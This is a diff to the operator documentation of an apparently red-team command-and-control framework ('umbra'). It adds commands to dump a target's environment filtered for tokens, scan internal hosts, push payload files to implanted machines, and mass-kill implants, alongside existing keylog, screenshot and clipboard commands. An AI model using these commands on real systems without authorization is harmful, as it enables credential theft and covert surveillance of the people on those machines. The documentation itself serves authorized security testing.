@@ -305,7 +305,20 @@ umbra keylog-file web-01 /tmp/keys.log --seconds 300   # the keys, to be fetched
 umbra registry win-01 "SOFTWARE\Microsoft" --hive HKLM  # the Windows registry
 umbra screenshot web-01 screen.png          # the screen of the target
 umbra clipboard web-01                      # the clipboard of the target
+umbra env web-01 --filter TOKEN            # the environment of the target
+umbra resolve web-01 db.internal           # where a name points at
+umbra scan web-01 10.0.0.0/29 --ports 22,80,443   # who answers
+umbra touch web-01 /tmp/marker             # create a file and stamp it
 ```
+
+The scan is a plain TCP connect: it says which hosts answered, it does not
+read a banner and it does not touch the service it finds.  The range is
+expanded by the beacon itself, and the number of addresses is capped, so a
+`/8` cannot turn into sixteen million connect attempts.
+
+`umbra env` is worth a look early on every host: the environment of a
+service account holds the paths, the endpoints and the tokens that the
+process itself uses.
 
 ## 3c. The dashboard
 
@@ -341,6 +354,36 @@ The dashboard is a **local** listener by default.  Putting it on a public
 address means putting the operator token on a public address as well, and
 that is a decision an operator makes on purpose, not one a default makes
 for them.
+
+## 3d. The artifact store
+
+The team server keeps files: a payload, a configuration, a tool.  The
+operator puts a file into the store once and pushes it to every host that
+needs it, instead of uploading the same bytes again for every machine.
+
+```bash
+umbra artifact list                                    # what the server holds
+umbra artifact put payload.bin --file ./payload.bin    # once
+umbra artifact push payload.bin web-01 --path /tmp/payload.bin
+umbra artifact get payload.bin --file ./payload.bin    # back again
+umbra artifact remove payload.bin
+```
+
+The store is content addressed: the blob is written under the SHA-256 of its
+contents, so two uploads of the same file share one copy on disk, and the
+digest is shown with the entry.  `umbra artifact list` prints it.
+
+A push is not a new beacon command.  The server builds a chain of ordinary
+`upload` tasks, one per chunk, and the beacon writes them one after the
+other; the last chunk closes the file and answers with the SHA-256 of the
+whole file, so the operator can check the copy on the target against the
+copy in the store.  A chunk that fails stops the chain instead of leaving a
+hole in the file.
+
+The uploads are chunked because the frames are bounded: 256 KiB per request,
+which always fits in one frame with room to spare.  The store lives next to
+the state file (`<data dir>/artifacts`), so a deployment that already gives
+the server a writable data directory needs no extra setup.
 
 ## 4. Beacon tuning
 
@@ -399,6 +442,20 @@ off exponentially up to 5 minutes, so a beacon never hammers a dead server.
   first.  A full reset (the file, the keys, everything) means: stop the
   server, delete `data_file`, **and rotate the agent PSK and operator
   tokens** (delete the implants or they will simply re-register).
+* To end an engagement on the *target* side: `umbra panic` queues the exit
+  task for the selected agents and marks them as burned, so the server
+  refuses every further task for them — work that is queued while the
+  operator is still cleaning up never reaches the machine.  The exit is a
+  task, not a pushed frame, so an implant that sleeps for an hour gets it
+  on its next check-in and dies then.  `umbra panic --all` reaches every
+  agent the server knows, the sleeping ones included.  The console asks for
+  the word "panic" before it does any of this, and the command is an admin
+  action, so it is in the audit trail.
+* A beacon that says which task kinds it implements is never asked for
+  anything else: the server refuses the task and names the kind, instead of
+  delivering a command the host cannot run.  The list is in the inventory
+  (`umbra agents --json`), and it is what tells an operator that a host is
+  out of scope before the command is written.
 
 ## 5a. The operator's notebook
 
@@ -481,9 +538,9 @@ manage the engagement.
 
 | Role | Can |
 |---|---|
-| `viewer` | read agents, tasks, results, audit, operators, chat, schedules |
-| `operator` | everything a viewer can, plus submit/cancel tasks, change beacon cadence, kill, chat, add schedules |
-| `admin` | everything, plus remove schedules and other engagement-wide actions |
+| `viewer` | read agents, tasks, results, audit, operators, chat, schedules, and the artifact store |
+| `operator` | everything a viewer can, plus submit/cancel tasks, change beacon cadence, kill, chat, add schedules, fill and push the artifact store |
+| `admin` | everything, plus remove schedules, panic an engagement and other engagement-wide actions |
 
 `umbra whoami` prints your role and the exact command list it allows, and the
 console refuses locally what the server would refuse anyway. A refusal is
